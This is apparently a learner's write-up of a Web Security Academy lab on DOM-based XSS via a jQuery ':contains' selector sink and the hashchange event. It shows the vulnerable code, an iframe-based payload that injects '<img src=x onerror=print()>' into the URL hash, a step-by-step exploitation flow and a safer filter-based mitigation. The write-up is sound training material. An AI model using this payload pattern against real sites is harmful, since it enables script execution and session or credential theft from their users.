# 🧪 DOM XSS in jQuery Selector Sink Using `hashchange` Event

## 📌 Overview

This lab demonstrates a **DOM-based Cross-Site Scripting (XSS)** vulnerability caused by unsafe usage of user-controlled data inside a jQuery selector.

The vulnerability is entirely client-side and triggered through manipulation of the URL fragment (`window.location.hash`).

---

## 🔍 Vulnerable Code

```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + 
        decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});

⚠ Root Cause

The application:

Reads data from window.location.hash

Decodes it using decodeURIComponent()

Injects it directly into a jQuery selector

Does not sanitize or escape the input

Dangerous Sink
:contains(USER_INPUT)


Since USER_INPUT originates from the URL fragment, it is fully attacker-controlled.

This leads to DOM-based XSS.

🚀 Exploitation Strategy

The vulnerable code executes only when the hashchange event fires.

To trigger it automatically without user interaction, an iframe-based delivery method was used.

Malicious Payload
<iframe src="https://LAB-ID.web-security-academy.net/#"
onload="this.src=this.src+'<img src=x onerror=print()>'">
</iframe>

🔬 Exploitation Flow
1️⃣ Victim visits exploit page

The victim loads the attacker-controlled exploit server.

2️⃣ iframe loads vulnerable application

The application loads with an empty hash:

https://LAB-ID.web-security-academy.net/#


The vulnerable script is waiting for a hash change.
3️⃣ iframe modifies the hash

When the iframe finishes loading:

this.src = this.src + '<img src=x onerror=print()>'


The URL becomes:

https://LAB-ID/#<img src=x onerror=print()>


The hash changes → hashchange event fires.

4️⃣ Vulnerable function executes

The application processes:

decodeURIComponent(window.location.hash.slice(1))


Which extracts:

<img src=x onerror=print()>
5️⃣ Selector Injection

The jQuery selector becomes:

$('section.blog-list h2:contains(<img src=x onerror=print()>)')


This breaks the selector context and injects HTML into the DOM.

6️⃣ JavaScript Execution
<img src=x onerror=print()>


src=x fails

onerror executes

print() runs

Lab is solved

Attack Flow Summary
Victim
 ↓
Exploit Server
 ↓
iframe loads vulnerable site
 ↓
iframe changes hash
 ↓
hashchange event fires
 ↓
jQuery selector injection
 ↓
HTML interpreted
 ↓
onerror executes
 ↓
print()

💥 Real-World Impact

If exploited in a real application, this vulnerability could allow:

Arbitrary JavaScript execution

Session hijacking

CSRF token theft

DOM manipulation

Credential harvesting

Since the attack is DOM-based, server logs may not clearly show the payload.

🔐 Recommended Mitigation

Developers should:

Never inject raw user input into selectors.

Escape or validate URL fragment data.

Avoid constructing dynamic selectors with string concatenation.

Use safer DOM APIs.

Example safer approach:

$('section.blog-list h2').filter(function() {
    return $(this).text() === userInput;
});

🧠 Key Takeaways

URL fragments are attacker-controlled.

hashchange events can trigger hidden execution paths.

jQuery selectors can become dangerous sinks.

DOM XSS requires no server interaction.

Proper input handling is critical in client-side code.

Practicing web exploitation responsibly in controlled environments.




